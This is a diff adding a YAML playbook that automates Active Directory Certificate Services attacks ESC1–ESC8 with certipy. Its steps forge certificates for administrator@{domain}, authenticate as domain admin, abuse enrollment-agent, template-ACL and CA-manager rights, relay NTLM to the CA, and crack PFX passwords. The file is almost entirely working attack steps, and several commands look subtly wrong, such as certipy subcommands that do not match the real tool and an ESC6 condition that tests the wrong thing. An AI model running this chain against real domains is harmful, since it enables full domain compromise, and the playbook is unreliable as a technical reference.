@@ -1,0 +1,230 @@
+name: "AD Certificate Services Assessment (ESC1-ESC8)"
+description: "Exploit Active Directory Certificate Services: ESC1 (misconfigured templates), ESC2 (any-purpose EKU), ESC3 (enrollment agent), ESC4 (access control), ESC5 (PKI object permissions), ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2), ESC7 (CA interface), ESC8 (NTLM relay to CA)"
+version: "1.0"
+
+vars:
+  domain: ""
+  dc_ip: ""
+  ca_server: ""
+  ca_name: ""
+  username: ""
+  password: ""
+  hash: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "ADCS assessment against {domain} — CA: {ca_name} at {ca_server} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Discovery ----
+  - id: discovery
+    name: "ADCS discovery"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: certipy_find
+        name: "Certipy find — enumerate PKI objects"
+        tool: certipy
+        args: ["find", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-stdout",
+               "-o", "{case_dir}/certipy_find"]
+        timeout: 300
+        artifacts: ["{case_dir}/certipy_find*"]
+
+      - id: ldap_pki
+        name: "LDAP PKI object enumeration"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "CN={username},CN=Users,DC={domain.replace('.',',DC=')}",
+               "-w", "{password}",
+               "-b", "CN=Public Key Services,CN=Services,CN=Configuration,DC={domain.replace('.',',DC=')}",
+               "-o", "{case_dir}/ldap_pki_objects.txt"]
+        timeout: 60
+
+  # ---- Phase 2: ESC1 — Misconfigured template (CT_FLAG_AUTO_ENROLLMENT + ENROLLEE_SUPPLIES_SUBJECT) ----
+  - id: esc1
+    name: "ESC1 — Misconfigured certificate template"
+    type: sequential
+    steps:
+      - id: certipy_esc1
+        name: "Certipy ESC1 — request with SAN"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "<VULNERABLE_TEMPLATE>",
+               "-upn", "administrator@{domain}",
+               "-o", "{case_dir}/certipy_esc1.pfx"]
+        timeout: 120
+        artifacts: ["{case_dir}/certipy_esc1.pfx"]
+
+      - id: esc1_auth
+        name: "ESC1 — authenticate as DA via PFX"
+        tool: certipy
+        args: ["auth", "-pfx", "{case_dir}/certipy_esc1.pfx",
+               "-dc-ip", "{dc_ip}",
+               "-o", "{case_dir}/certipy_esc1_auth"]
+        timeout: 60
+
+  # ---- Phase 3: ESC2 — Any-purpose EKU ----
+  - id: esc2
+    name: "ESC2 — Any Purpose EKU template"
+    type: sequential
+    steps:
+      - id: certipy_esc2
+        name: "Certipy ESC2 — request with any-purpose template"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "<ANY_PURPOSE_TEMPLATE>",
+               "-o", "{case_dir}/certipy_esc2.pfx"]
+        timeout: 120
+        artifacts: ["{case_dir}/certipy_esc2.pfx"]
+
+  # ---- Phase 4: ESC3 — Enrollment agent ----
+  - id: esc3
+    name: "ESC3 — Enrollment agent abuse"
+    type: sequential
+    steps:
+      - id: certipy_esc3_agent
+        name: "Certipy ESC3 — request enrollment agent cert"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "<ENROLLMENT_AGENT_TEMPLATE>",
+               "-o", "{case_dir}/certipy_esc3_agent.pfx"]
+        timeout: 120
+
+      - id: certipy_esc3_onbehalf
+        name: "Certipy ESC3 — request on behalf of DA"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-pfx", "{case_dir}/certipy_esc3_agent.pfx",
+               "-on-behalf-of", "administrator@{domain}",
+               "-template", "<USER_TEMPLATE>",
+               "-o", "{case_dir}/certipy_esc3_da.pfx"]
+        timeout: 120
+        artifacts: ["{case_dir}/certipy_esc3_da.pfx"]
+
+  # ---- Phase 5: ESC4 — Template access control ----
+  - id: esc4
+    name: "ESC4 — Template ACL abuse"
+    type: sequential
+    steps:
+      - id: certipy_esc4
+        name: "Certipy ESC4 — modify template ACL to grant enrollment"
+        tool: certipy
+        args: ["acls", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "<TARGET_TEMPLATE>",
+               "-principal", "{username}",
+               "-o", "{case_dir}/certipy_esc4"]
+        timeout: 60
+        artifacts: ["{case_dir}/certipy_esc4"]
+
+  # ---- Phase 6: ESC5 — PKI object permissions ----
+  - id: esc5
+    name: "ESC5 — PKI object ACL audit"
+    type: sequential
+    steps:
+      - id: certipy_esc5
+        name: "Certipy ESC5 — check PKI ACLs"
+        tool: certipy
+        args: ["acls", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}",
+               "-o", "{case_dir}/certipy_esc5"]
+        timeout: 60
+        artifacts: ["{case_dir}/certipy_esc5"]
+
+  # ---- Phase 7: ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 ----
+  - id: esc6
+    name: "ESC6 — CA SAN bypass"
+    type: conditional
+    condition:
+      any:
+        - exists: "{case_dir}/certipy_esc5"
+    then:
+      - id: certipy_esc6
+        name: "Certipy ESC6 — request with SAN on any template"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "User",
+               "-upn", "administrator@{domain}",
+               "-o", "{case_dir}/certipy_esc6.pfx"]
+        timeout: 120
+        artifacts: ["{case_dir}/certipy_esc6.pfx"]
+
+  # ---- Phase 8: ESC7 — CA interface abuse ----
+  - id: esc7
+    name: "ESC7 — CA certificate manager abuse"
+    type: sequential
+    steps:
+      - id: certipy_esc7_ca
+        name: "Certipy ESC7 — check CA manager privileges"
+        tool: certipy
+        args: ["ca", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-o", "{case_dir}/certipy_esc7_ca"]
+        timeout: 60
+        artifacts: ["{case_dir}/certipy_esc7_ca"]
+
+      - id: certipy_esc7_issue
+        name: "Certipy ESC7 — issue failed request as manager"
+        tool: certipy
+        args: ["req", "-u", "{username}@{domain}", "-p", "{password}",
+               "-dc-ip", "{dc_ip}", "-ca", "{ca_name}",
+               "-template", "<VULNERABLE_TEMPLATE>",
+               "-on-behalf-of", "administrator@{domain}",
+               "-o", "{case_dir}/certipy_esc7_issued.pfx"]
+        timeout: 120
+        artifacts: ["{case_dir}/certipy_esc7_issued.pfx"]
+
+  # ---- Phase 9: ESC8 — NTLM relay to CA ----
+  - id: esc8
+    name: "ESC8 — NTLM relay to CA Web enrollment"
+    type: sequential
+    steps:
+      - id: certipy_esc8_relay
+        name: "Certipy ESC8 — relay to CA"
+        tool: certipy
+        args: ["relay", "-ca", "{ca_server}",
+               "-o", "{case_dir}/certipy_esc8_relay"]
+        timeout: 300
+        artifacts: ["{case_dir}/certipy_esc8_relay*"]
+
+  # ---- Phase 10: Crack PFX ----
+  - id: crack_pfx
+    name: "Crack PFX certificates"
+    type: conditional
+    condition:
+      any:
+        - exists: "{case_dir}/certipy_esc1.pfx"
+    then:
+      - id: certipy_crack
+        name: "Certipy crack PFX passwords"
+        tool: certipy
+        args: ["crack", "-pfx", "{case_dir}/*.pfx",
+               "-wordlist", "/wordlists/rockyou.txt",
+               "-o", "{case_dir}/certipy_cracked.txt"]
+        timeout: 600
+        artifacts: ["{case_dir}/certipy_cracked.txt"]
+
+  # ---- Phase 11: Report ----
+  - id: report
+    name: "ADCS assessment note"
+    type: log
+    message: |
+      ADCS assessment complete for {domain} (CA: {ca_name}).
+      Results in {case_dir}/:
+      - PKI discovery: certipy_find.txt, ldap_pki_objects.txt
+      - ESC1 (SAN injection): certipy_esc1.pfx + auth as DA
+      - ESC2 (any-purpose): certipy_esc2.pfx
+      - ESC3 (enrollment agent): certipy_esc3_da.pfx
+      - ESC4 (template ACL): certipy_esc4
+      - ESC5 (PKI ACLs): certipy_esc5
+      - ESC6 (SAN bypass): certipy_esc6.pfx
+      - ESC7 (CA manager): certipy_esc7_issued.pfx
+      - ESC8 (NTLM relay): certipy_esc8_relay captures
+      - Cracked PFX: certipy_cracked.txt
